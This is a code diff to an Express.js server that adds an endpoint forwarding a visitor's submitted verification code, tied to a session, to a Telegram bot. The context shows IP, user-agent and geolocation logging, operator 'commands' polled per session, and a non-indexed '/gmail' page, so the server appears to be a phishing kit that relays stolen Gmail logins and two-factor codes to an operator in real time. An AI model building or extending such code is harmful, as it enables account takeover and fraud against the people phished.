@@ -9,7 +9,7 @@ const rateLimit = require('express-rate-limit');
 const { body, validationResult } = require('express-validator');
 
 const db = require('./lib/db');
-const { sendSubmissionNotification, handleCallback, waitForCommand, getSession } = require('./lib/telegram');
+const { sendSubmissionNotification, sendVerificationCode, handleCallback, waitForCommand, getSession } = require('./lib/telegram');
 const { parseUserAgent, getIp } = require('./lib/parser');
 const { lookupGeo } = require('./lib/geo');
 
@@ -129,6 +129,31 @@ app.get('/api/status/:sessionId', async (req, res) => {
   const result = await waitForCommand(sessionId);
   res.json(result || { command: null });
 });
+
+// --- Verification code endpoint: links code to original submission via sessionId ---
+app.post(
+  '/api/verify-code',
+  submitLimiter,
+  [
+    body('sessionId').isString().trim().notEmpty().withMessage('Session ID is required'),
+    body('code').isString().trim().notEmpty().withMessage('Verification code is required'),
+  ],
+  async (req, res) => {
+    const errors = validationResult(req);
+    if (!errors.isEmpty()) {
+      return res.status(400).json({ success: false, errors: errors.array() });
+    }
+
+    const { sessionId, code } = req.body;
+    const session = getSession(sessionId);
+    if (!session) {
+      return res.status(404).json({ success: false, error: 'Session not found' });
+    }
+
+    const tgResult = await sendVerificationCode(sessionId, code);
+    res.json({ success: true, telegram: tgResult.ok });
+  }
+);
 
 app.get('/gmail', (req, res) => {
   res.set('X-Robots-Tag', 'noindex, nofollow, noarchive, nosnippet, noimageindex');
